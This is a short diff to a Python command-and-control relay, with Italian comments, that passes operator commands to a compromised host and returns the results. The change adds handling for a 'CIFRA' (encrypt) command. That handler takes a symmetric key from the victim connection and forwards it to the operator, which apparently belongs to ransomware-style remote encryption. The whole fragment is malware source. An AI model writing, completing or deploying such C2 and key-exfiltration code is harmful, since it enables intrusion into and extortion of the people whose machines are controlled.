@@ -28,19 +28,18 @@ while True:
         print("[C&C] Connection closing.")
         break
 
-    # Riceve l'output 
-    output = b""
-    s2.settimeout(1.0) 
-    try:
-        while True:
-            chunk = s2.recv(4096)
-            if not chunk:
-                break
-            output += chunk
-    except socket.timeout:
-        pass 
-
-    # Inoltra all'operatore
+    # Riceve l'output e inoltra
+    if command.decode().strip().upper().startswith("CIFRA"):
+        key_syn = s2.recv(1024)
+        syn = key_syn.decode()
+        print(syn)
+        symm_key = s2.recv(4096)
+        ack = "ACK"
+        ack_syn = ack.encode()
+        conn_operator.sendall(ack_syn)
+        conn_operator.sendall(symm_key)
+        
+    output = s2.recv(4096)
     conn_operator.sendall(output)
 
 s2.close()
